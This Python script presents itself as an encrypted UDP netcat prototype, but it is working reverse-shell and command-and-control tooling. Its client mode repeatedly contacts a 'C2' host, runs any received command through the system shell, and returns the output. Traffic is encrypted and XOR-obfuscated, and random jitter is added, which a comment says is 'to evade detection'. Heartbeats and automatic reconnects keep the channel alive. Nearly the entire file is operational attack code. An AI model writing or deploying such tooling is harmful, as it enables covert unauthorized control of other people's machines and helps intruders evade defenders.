import sys
import os
import time
import socket
import select
import random
import subprocess
import argparse
from cryptography.fernet import Fernet

# ==========================================
# ⚙️ CONFIGURATION & CONFIG CONSTANTS
# ==========================================
BUFFER_SIZE = 4096            # Managed buffer size
HEARTBEAT_INTERVAL = 10       # Seconds between heartbeats
JITTER_RANGE = (1.0, 4.0)     # Random delay range to evade detection
XOR_KEY = 0xAA                # Single-byte XOR key for traffic obfuscation

# ==========================================
# 🛡️ CRYPTOGRAPHY & OBFUSCATION FUNCTIONS
# ==========================================
def xor_obfuscate(data: bytes) -> bytes:
    """Applies a simple XOR obfuscation layer over the payload."""
    return bytes([b ^ XOR_KEY for b in data])

def encrypt_payload(fernet: Fernet, data: bytes) -> bytes:
    """Fernet encrypts, then XOR obfuscates the payload."""
    encrypted = fernet.encrypt(data)
    return xor_obfuscate(encrypted)

def decrypt_payload(fernet: Fernet, data: bytes) -> bytes:
    """De-obfuscates XOR, then decrypts via Fernet."""
    de_obfuscated = xor_obfuscate(data)
    return fernet.decrypt(de_obfuscated)

# ==========================================
# 🚀 SERVER MODE (Listener)
# ==========================================
def run_server(host: str, port: int, key: str):
    fernet = Fernet(key.encode())
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Try to resolve the listening host if it is a domain name
    try:
        resolved_host = socket.gethostbyname(host)
    except socket.gaierror as e:
        print(f"[!] DNS Resolution failed for listener host {host}: {e}")
        sys.exit(1)
        
    sock.bind((resolved_host, port))
    
    print(f"[*] Listening securely on UDP {resolved_host}:{port}...")
    client_address = None

    while True:
        try:
            r_list, _, _ = select.select([sock, sys.stdin], [], [])
            
            for ready in r_list:
                if ready == sock:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    client_address = addr  
                    
                    try:
                        decrypted = decrypt_payload(fernet, data)
                        if decrypted == b"HEARTBEAT":
                            sock.sendto(encrypt_payload(fernet, b"ACK"), addr)
                            continue
                            
                        print(decrypted.decode('utf-8', errors='ignore'), end='', flush=True)
                    except Exception:
                        pass 
                        
                elif ready == sys.stdin and client_address:
                    cmd = sys.stdin.readline()
                    if cmd:
                        payload = encrypt_payload(fernet, cmd.encode())
                        sock.sendto(payload, client_address)
                        
        except KeyboardInterrupt:
            print("\n[*] Shutting down server.")
            break
        except Exception as e:
            print(f"\n[!] Server error: {e}")

# ==========================================
# 🔄 CLIENT MODE (Reverse Shell & Jitter)
# ==========================================
def run_client(host: str, port: int, key: str):
    fernet = Fernet(key.encode())
    
    while True: 
        print(f"[*] Attempting domain resolution and connection to C2 {host}:{port}...")
        try:
            # Resolve the domain name to an IP address dynamically on each loop iteration
            try:
                target_ip = socket.gethostbyname(host)
                server_addr = (target_ip, port)
            except socket.gaierror as e:
                print(f"[!] DNS Resolution failed for {host}: {e}. Retrying...")
                time.sleep(random.uniform(5, 10))
                continue

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5.0)
            
            sock.sendto(encrypt_payload(fernet, b"Client Initialized\n"), server_addr)
            last_heartbeat = time.time()
            
            while True:
                jitter = random.uniform(*JITTER_RANGE)
                r, _, _ = select.select([sock], [], [], jitter)
                
                if r:
                    try:
                        data, _ = sock.recvfrom(BUFFER_SIZE)
                        cmd = decrypt_payload(fernet, data)
                        
                        if cmd == b"ACK":
                            continue 
                            
                        proc = subprocess.Popen(
                            cmd.decode().strip(), shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                        )
                        stdout, stderr = proc.communicate()
                        
                        response = stdout + stderr
                        if not response:
                            response = b"Command executed (No output).\n"
                        sock.sendto(encrypt_payload(fernet, response), server_addr)
                    except (socket.timeout, ConnectionResetError):
                        break 
                
                if time.time() - last_heartbeat > HEARTBEAT_INTERVAL:
                    try:
                        sock.sendto(encrypt_payload(fernet, b"HEARTBEAT"), server_addr)
                        last_heartbeat = time.time()
                    except Exception:
                        break 

        except Exception as e:
            pass 
            
        time.sleep(random.uniform(5, 10))

# ==========================================
# 🏁 MAIN ENTRYPOINT
# ==========================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Secure Encrypted UDP Netcat Prototype")
    parser.add_argument("-l", "--listen", action="store_true", help="Run in Server (Listener) mode")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port allocation")
    parser.add_argument("-s", "--secret", type=str, required=True, help="Fernet Base64 Pre-Shared Key")
    parser.add_argument("host", type=str, nargs="?", default="0.0.0.0", help="Target Host Address or Domain")
    
    args = parser.parse_args()
    
    if args.listen:
        run_server(args.host, args.port, args.secret)
    else:
        if args.host == "0.0.0.0":
            print("[!] Error: Please define a remote target IP or Domain for Client execution mode.")
            sys.exit(1)
        run_client(args.host, args.port, args.secret)
